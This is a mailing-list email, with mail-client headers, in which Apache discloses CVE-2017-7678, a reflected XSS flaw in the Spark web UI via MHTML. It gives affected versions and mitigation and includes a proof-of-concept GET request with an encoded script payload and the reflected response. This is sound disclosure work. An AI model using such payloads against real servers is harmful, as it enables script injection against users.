X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1504" "Wednesday" "12" "July" "2017" "10:31:17" "+0000" "Sean Owen" "srowen@apache.org" "<CAEccTywUwRDdXZBHeUnuF6Sg+-U1Zd+MMqz_F9QDNRPts9O46Q@mail.gmail.com>" "48" "[oss-security] CVE-2017-7678 Apache Spark XSS web UI MHTML vulnerability" nil nil nil "7" "2017071210:31:17" "[oss-security] CVE-2017-7678 Apache Spark XSS web UI MHTML vulnerability" (number mark "U       srowen@apach Jul 12   48/1504  " thread-indent "\"[oss-security] CVE-2017-7678 Apache Spark XSS web UI MHTML vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 21966 invoked by uid 550); 12 Jul 2017 10:54:18 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 10035 invoked from network); 12 Jul 2017 10:31:41 -0000
X-Gm-Message-State: AIVw111UIHUht23/9TWeWwngODYxi4VWNtnEwuvuApKu2yO4A0OEydno
	5W9LVjSzJ0JboJ1WxZtorqVGsesrsw==
X-Received: by 10.159.39.227 with SMTP id b90mr2787927uab.105.1499855487764;
 Wed, 12 Jul 2017 03:31:27 -0700 (PDT)
MIME-Version: 1.0
From: Sean Owen <srowen@apache.org>
Date: Wed, 12 Jul 2017 10:31:17 +0000
X-Gmail-Original-Message-ID: <CAEccTywUwRDdXZBHeUnuF6Sg+-U1Zd+MMqz_F9QDNRPts9O46Q@mail.gmail.com>
Message-ID: <CAEccTywUwRDdXZBHeUnuF6Sg+-U1Zd+MMqz_F9QDNRPts9O46Q@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary="94eb2c1244a2900ff705541c51c7"
Subject: [oss-security] CVE-2017-7678 Apache Spark XSS web UI MHTML vulnerability

--94eb2c1244a2900ff705541c51c7
Content-Type: text/plain; charset="UTF-8"

Severity: Low

Vendor: The Apache Software Foundation

Versions Affected:
Versions of Apache Spark before 2.2.0

Description:
It is possible for an attacker to take advantage of a user's trust in the
server to trick them into visiting a link that points to a shared Spark
cluster and submits data including MHTML to the Spark master, or history
server. This data, which could contain a script, would then be reflected
back to the user and could be evaluated and executed by MS Windows-based
clients. It is not an attack on Spark itself, but on the user, who may then
execute the script inadvertently when viewing elements of the Spark web UIs.

Mitigation:
Update to Apache Spark 2.2.0 or later.

Example:
Request:
GET
/app/?appId=Content-Type:%20multipart/related;%20boundary=_AppScan%0d%0a--
_AppScan%0d%0aContent-Location:foo%0d%0aContent-Transfer-
Encoding:base64%0d%0a%0d%0aPGh0bWw%2bPHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD48L2h0bWw%2b%0d%0a
HTTP/1.1

Excerpt from response:
<div class="row-fluid">No running application with ID Content-Type:
multipart/related;
boundary=_AppScan
--_AppScan
Content-Location:foo
Content-Transfer-Encoding:base64
PGh0bWw+PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD48L2h0bWw+
</div>

Result: In the above payload the BASE64 data decodes as:
<html><script>alert("XSS")</script></html>

Credit:
Mike Kasper, Nicholas Marion
IBM z Systems Center for Secure Engineering

--94eb2c1244a2900ff705541c51c7--
